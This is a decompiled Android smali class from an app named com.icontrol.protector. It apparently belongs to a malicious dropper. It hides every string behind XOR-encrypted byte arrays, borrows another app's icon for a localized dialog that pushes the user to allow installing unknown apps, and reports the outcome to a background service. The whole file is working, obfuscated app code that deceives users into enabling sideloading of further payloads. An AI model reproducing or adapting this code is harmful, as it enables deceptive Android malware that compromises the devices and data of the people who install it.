.class public Lcom/icontrol/protector/Requestinstall;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field private static b:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a()V
    .locals 9

    .line 1
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/app/AlertDialog$Builder;

    const v2, 0x10302d1

    invoke-direct {v1, p0, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    const/4 v2, 0x2

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sget-object v3, Lcom/icontrol/protector/Requestinstall;->b:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/16 v6, 0xc31

    const/4 v7, 0x1

    const/4 v8, 0x3

    if-eq v5, v6, :cond_3

    const/16 v6, 0xc6b

    if-eq v5, v6, :cond_2

    const/16 v6, 0xca9

    if-eq v5, v6, :cond_1

    const/16 v6, 0xe7e

    if-eq v5, v6, :cond_0

    goto :goto_0

    :cond_0
    new-array v5, v2, [B

    fill-array-data v5, :array_2

    new-array v6, v4, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v8

    goto :goto_1

    :cond_1
    new-array v5, v2, [B

    fill-array-data v5, :array_4

    new-array v6, v4, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    new-array v5, v2, [B

    fill-array-data v5, :array_6

    new-array v6, v4, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v2

    goto :goto_1

    :cond_3
    new-array v5, v2, [B

    fill-array-data v5, :array_8

    new-array v6, v4, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v7

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v0, -0x1

    :goto_1
    const/16 v5, 0x39

    if-eqz v0, :cond_8

    if-eq v0, v7, :cond_7

    if-eq v0, v2, :cond_6

    if-eq v0, v8, :cond_5

    new-array v0, v2, [B

    fill-array-data v0, :array_a

    new-array v2, v4, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v5, [B

    fill-array-data v5, :array_c

    new-array v6, v4, [B

    fill-array-data v6, :array_d

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    :goto_2
    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto/16 :goto_3

    :cond_5
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v2, v4, [B

    fill-array-data v2, :array_f

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v5, 0x44

    new-array v5, v5, [B

    fill-array-data v5, :array_10

    new-array v6, v4, [B

    fill-array-data v6, :array_11

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    goto :goto_2

    :cond_6
    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_12

    new-array v2, v4, [B

    fill-array-data v2, :array_13

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v5, 0x4b

    new-array v5, v5, [B

    fill-array-data v5, :array_14

    new-array v6, v4, [B

    fill-array-data v6, :array_15

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    goto :goto_2

    :cond_7
    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_16

    new-array v2, v4, [B

    fill-array-data v2, :array_17

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v5, 0x5c

    new-array v5, v5, [B

    fill-array-data v5, :array_18

    new-array v6, v4, [B

    fill-array-data v6, :array_19

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    goto :goto_2

    :cond_8
    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v2, v4, [B

    fill-array-data v2, :array_1b

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v5, [B

    fill-array-data v5, :array_1c

    new-array v6, v4, [B

    fill-array-data v6, :array_1d

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    goto/16 :goto_2

    :goto_3
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/16 v5, 0x13

    new-array v5, v5, [B

    fill-array-data v5, :array_1e

    new-array v6, v4, [B

    fill-array-data v6, :array_1f

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const/16 v2, 0xb

    new-array v2, v2, [B

    fill-array-data v2, :array_20

    new-array v4, v4, [B

    fill-array-data v4, :array_21

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    :try_start_1
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v1, v3}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :goto_4
    new-instance v2, Lcom/icontrol/protector/Requestinstall$a;

    invoke-direct {v2, p0}, Lcom/icontrol/protector/Requestinstall$a;-><init>(Lcom/icontrol/protector/Requestinstall;)V

    invoke-virtual {v1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void

    :array_0
    .array-data 1
        -0x2bt
        0x42t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x66t
        0x9t
        0x27t
        0x8t
        -0x31t
        0x7et
        -0x2ft
        0x3dt
    .end array-data

    :array_2
    .array-data 1
        0x69t
        -0x7at
    .end array-data

    nop

    :array_3
    .array-data 1
        0x1dt
        -0xct
        -0x6t
        0x6ft
        0x17t
        0x26t
        -0xdt
        -0x42t
    .end array-data

    :array_4
    .array-data 1
        -0x1dt
        -0x52t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x7at
        -0x40t
        -0x3t
        -0x35t
        0x4dt
        0x42t
        -0x2t
        -0x1et
    .end array-data

    :array_6
    .array-data 1
        -0x56t
        -0x3bt
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x37t
        -0x55t
        0x13t
        0x72t
        0x71t
        -0x34t
        -0x7t
        0x16t
    .end array-data

    :array_8
    .array-data 1
        -0x79t
        -0x5dt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x1at
        -0x2ft
        -0x77t
        -0x26t
        -0x37t
        -0x1at
        0x57t
        0x2bt
    .end array-data

    :array_a
    .array-data 1
        -0x5t
        -0x7at
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x4ct
        -0x33t
        0x0t
        0x40t
        0x44t
        0x3dt
        0x4bt
        -0x7ft
    .end array-data

    :array_c
    .array-data 1
        0x5ft
        -0x7ft
        -0x77t
        0x13t
        0x4bt
        -0x4dt
        0x63t
        0x1et
        0x5ft
        -0x7at
        -0x34t
        0x58t
        0x4ft
        -0x5at
        0x63t
        0x1et
        0x5et
        -0x62t
        -0x7ct
        0xct
        0x41t
        -0xat
        0x77t
        0x5ft
        0x5ft
        -0x75t
        -0x77t
        0x54t
        0xet
        -0x5at
        0x7ft
        0x5bt
        0x4at
        -0x63t
        -0x34t
        0x58t
        0x4bt
        -0x48t
        0x72t
        0x5ct
        0x47t
        -0x75t
        -0x77t
        0x11t
        0x40t
        -0x5bt
        0x67t
        0x5ft
        0x47t
        -0x7et
        -0x77t
        0x1et
        0x5ct
        -0x47t
        0x7et
        0x4t
        0xbt
    .end array-data

    nop

    :array_d
    .array-data 1
        0x2bt
        -0x12t
        -0x57t
        0x78t
        0x2et
        -0x2at
        0x13t
        0x3et
    .end array-data

    :array_e
    .array-data 1
        0x1ct
        0x3ft
        0x13t
        0x68t
        0x28t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x48t
        0x5et
        0x7et
        0x9t
        0x45t
        0x3t
        -0x5ct
        0x40t
    .end array-data

    :array_10
    .array-data 1
        0x1at
        -0x68t
        -0x71t
        0x2at
        0x7bt
        -0x23t
        0x48t
        0x62t
        0x36t
        0x25t
        0x59t
        0x7ft
        0x70t
        0x7ft
        -0x67t
        0x6dt
        0x2ct
        -0x7ct
        -0x7ct
        0x7ft
        0x63t
        -0x37t
        0x51t
        0x6et
        0x2et
        -0x76t
        -0x38t
        0x36t
        -0x2ct
        0x1bt
        0x4ct
        0x6dt
        0x6ft
        0x24t
        0x76t
        0x2at
        0x65t
        -0x23t
        0x41t
        0x62t
        0x21t
        -0x3ft
        -0x4ft
        -0x64t
        -0x55t
        -0x29t
        0x49t
        0x66t
        0x68t
        -0x68t
        -0x7ft
        0x7ft
        0x72t
        -0x38t
        0x4et
        0x6at
        0x21t
        -0x73t
        -0x73t
        -0x66t
        -0x78t
        -0x38t
        0x4ct
        0x71t
        0x26t
        -0x71t
        -0x2et
        0x7ft
    .end array-data

    :array_11
    .array-data 1
        0x4ft
        -0x1ft
        -0x18t
        0x5ft
        0x17t
        -0x44t
        0x25t
        0x3t
    .end array-data

    :array_12
    .array-data 1
        -0x33t
        0x4t
        0x46t
        0x4ct
        0x78t
        0x4at
        -0x63t
        -0x25t
        -0x4at
    .end array-data

    nop

    :array_13
    .array-data 1
        0x29t
        -0x47t
        -0x7t
        -0x5ct
        -0x5t
        -0x9t
        0x78t
        0x7ft
    .end array-data

    :array_14
    .array-data 1
        -0x5ct
        -0x1ft
        0x47t
        0x1bt
        0x2bt
        0x11t
        0x10t
        0x67t
        -0x1t
        -0x44t
        0x47t
        0x6bt
        0x76t
        0x3t
        0x5ct
        0x3dt
        -0x18t
        -0x2et
        0x18t
        0x45t
        0x1et
        0x73t
        0x4bt
        0x47t
        -0x5at
        -0x2bt
        0x7ct
        0x19t
        0xdt
        0x17t
        0x12t
        0x4ct
        -0x10t
        -0x42t
        0x77t
        0x49t
        0x77t
        0x17t
        0x75t
        0x35t
        -0x4t
        -0x2bt
        0x15t
        0x50t
        0x26t
        0x72t
        0x64t
        0x75t
        -0x59t
        -0x33t
        0x55t
        0x1bt
        0x2at
        0x19t
        0x10t
        0x61t
        -0x1bt
        -0x43t
        0x45t
        0x74t
        0x75t
        0x2at
        0x79t
        0x3dt
        -0x3t
        -0x9t
        0x18t
        0x51t
        0x18t
        0x7ft
        0x57t
        0x5ft
        -0x51t
        -0x1bt
        0x67t
    .end array-data

    :array_15
    .array-data 1
        0x40t
        0x59t
        -0x3t
        -0x1t
        -0x6ft
        -0x69t
        -0xct
        -0x26t
    .end array-data

    :array_16
    .array-data 1
        0x71t
        -0x61t
        0x77t
        -0x30t
        0x5et
        0x60t
        0x61t
        0x12t
        0x70t
        -0x4ft
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x57t
        0x35t
        -0x52t
        0x51t
        -0x7at
        -0x27t
        -0x48t
        -0x68t
    .end array-data

    :array_18
    .array-data 1
        0x6at
        -0x5t
        0x61t
        -0x5ft
        -0x3bt
        -0x3at
        -0x67t
        0x6et
        0x6bt
        -0x28t
        0x60t
        -0x63t
        0x3dt
        -0x4dt
        -0x7t
        0x36t
        0x37t
        -0x5at
        0x31t
        0x5t
        -0x3bt
        -0x34t
        -0x67t
        0x6bt
        0x6bt
        -0x2bt
        0x60t
        -0x6et
        -0x3bt
        -0x3dt
        -0x67t
        0x65t
        0x6at
        -0x3t
        -0x68t
        -0x4t
        -0x68t
        -0x4dt
        -0x13t
        0x37t
        0x1ct
        -0x59t
        0x13t
        -0x4t
        -0x6at
        -0x4dt
        -0x19t
        -0x31t
        0x6bt
        -0xdt
        -0x68t
        -0x4t
        -0x69t
        -0x4dt
        -0xft
        0x37t
        0x1ft
        -0x5at
        0x31t
        0x5t
        -0x3bt
        -0x3ft
        -0x67t
        0x6at
        0x6at
        -0x4t
        0x61t
        -0x51t
        -0x3ct
        -0x13t
        0x60t
        0x37t
        0x14t
        -0x5at
        0x3ct
        -0x3t
        -0x49t
        -0x4dt
        -0x15t
        0x37t
        0x1bt
        -0x5at
        0x32t
        -0x3t
        -0x49t
        0x4bt
        -0x67t
        0x6at
        0x6at
        -0x7t
        -0x7et
        0x5t
    .end array-data

    :array_19
    .array-data 1
        -0x4dt
        0x7ft
        -0x48t
        0x25t
        0x1dt
        0x6bt
        0x40t
        -0x11t
    .end array-data

    :array_1a
    .array-data 1
        0xdt
        0x4dt
        0x50t
        -0x27t
        0x40t
        0x25t
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x48t
        0x23t
        0x31t
        -0x45t
        0x2ct
        0x40t
        -0x22t
        -0x7t
    .end array-data

    :array_1c
    .array-data 1
        -0x74t
        -0x4et
        0x2ct
        -0x47t
        -0x4dt
        -0x2at
        0x1t
        0x34t
        -0x54t
        -0x4bt
        0x69t
        -0xet
        -0x49t
        -0x3dt
        0x1t
        0x34t
        -0x53t
        -0x53t
        0x21t
        -0x5at
        -0x47t
        -0x6dt
        0x15t
        0x75t
        -0x54t
        -0x48t
        0x2ct
        -0x2t
        -0xat
        -0x3dt
        0x1dt
        0x71t
        -0x47t
        -0x52t
        0x69t
        -0xet
        -0x4dt
        -0x23t
        0x10t
        0x76t
        -0x4ct
        -0x48t
        0x2ct
        -0x45t
        -0x48t
        -0x40t
        0x5t
        0x75t
        -0x4ct
        -0x4ft
        0x2ct
        -0x4ct
        -0x5ct
        -0x24t
        0x1ct
        0x2et
        -0x8t
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x28t
        -0x23t
        0xct
        -0x2et
        -0x2at
        -0x4dt
        0x71t
        0x14t
    .end array-data

    :array_1e
    .array-data 1
        0x23t
        -0x5ct
        -0x50t
        -0x15t
        0x7bt
        0x12t
        -0xbt
        0x3t
        0x2ft
        -0x5et
        -0x47t
        -0x15t
        0x6ct
        0x19t
        -0x1t
        0x15t
        0x29t
        -0x5bt
        -0x46t
    .end array-data

    :array_1f
    .array-data 1
        0x40t
        -0x35t
        -0x23t
        -0x3bt
        0x1at
        0x7ct
        -0x6ft
        0x71t
    .end array-data

    :array_20
    .array-data 1
        0x13t
        0x6ct
        -0x26t
        0x36t
        0x7dt
        0x17t
        0x66t
        -0x66t
        0x38t
        0x62t
        -0x34t
    .end array-data

    :array_21
    .array-data 1
        0x54t
        0x3t
        -0x4bt
        0x51t
        0x11t
        0x72t
        0x46t
        -0x36t
    .end array-data
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/16 p3, 0x3e9

    if-ne p1, p3, :cond_1

    const/4 p1, -0x1

    const/16 p3, 0xc

    const/16 v0, 0x8

    if-ne p2, p1, :cond_0

    sget-object p1, Lcom/icontrol/protector/Requestinstall;->b:Landroid/content/Context;

    new-array p2, p3, [B

    fill-array-data p2, :array_0

    new-array p3, v0, [B

    fill-array-data p3, :array_1

    invoke-static {p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const/16 p3, 0x12

    new-array p3, p3, [B

    fill-array-data p3, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p3, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    :goto_0
    invoke-static {p1, p2, p3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_0
    sget-object p1, Lcom/icontrol/protector/Requestinstall;->b:Landroid/content/Context;

    new-array p2, p3, [B

    fill-array-data p2, :array_4

    new-array p3, v0, [B

    fill-array-data p3, :array_5

    invoke-static {p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const/16 p3, 0x17

    new-array p3, p3, [B

    fill-array-data p3, :array_6

    new-array v0, v0, [B

    fill-array-data v0, :array_7

    invoke-static {p3, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_1
    return-void

    :array_0
    .array-data 1
        -0x1dt
        0x4bt
        0x42t
        0xet
        -0x5ft
        -0x3dt
        -0x30t
        0x7et
        -0x35t
        0x55t
        0x41t
        0x9t
    .end array-data

    :array_1
    .array-data 1
        -0x76t
        0x25t
        0x31t
        0x7at
        -0x40t
        -0x51t
        -0x44t
        0x5et
    .end array-data

    :array_2
    .array-data 1
        0x5dt
        0x6dt
        -0x4dt
        0x64t
        0x22t
        -0x29t
        0x18t
        -0x76t
        0x62t
        0x66t
        -0x1ft
        0x4ct
        0x25t
        -0x3bt
        0x9t
        -0x71t
        0x68t
        0x6ct
    .end array-data

    nop

    :array_3
    .array-data 1
        0xdt
        0x8t
        -0x3ft
        0x9t
        0x4bt
        -0x5ct
        0x6bt
        -0x1dt
    .end array-data

    :array_4
    .array-data 1
        -0x32t
        0x54t
        0x31t
        -0x58t
        -0x42t
        0x29t
        -0x74t
        -0x20t
        -0x1at
        0x4at
        0x32t
        -0x51t
    .end array-data

    :array_5
    .array-data 1
        -0x59t
        0x3at
        0x42t
        -0x24t
        -0x21t
        0x45t
        -0x20t
        -0x40t
    .end array-data

    :array_6
    .array-data 1
        0x4t
        0x63t
        0x14t
        -0x2t
        0xet
        0x4ct
        -0x57t
        -0x17t
        0x22t
        0x65t
        0x18t
        -0x8t
        0x14t
        0x5dt
        -0x13t
        -0x65t
        0x15t
        0x6at
        0xct
        -0x12t
        0x5t
        0x4bt
        -0x3t
    .end array-data

    :array_7
    .array-data 1
        0x47t
        0xft
        0x7dt
        -0x65t
        0x60t
        0x38t
        -0x77t
        -0x45t
    .end array-data
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/Requestinstall;->b:Landroid/content/Context;

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt p1, v0, :cond_0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/qq;->a(Landroid/content/pm/PackageManager;)Z

    move-result p1

    if-nez p1, :cond_0

    invoke-direct {p0}, Lcom/icontrol/protector/Requestinstall;->a()V

    :cond_0
    return-void
.end method
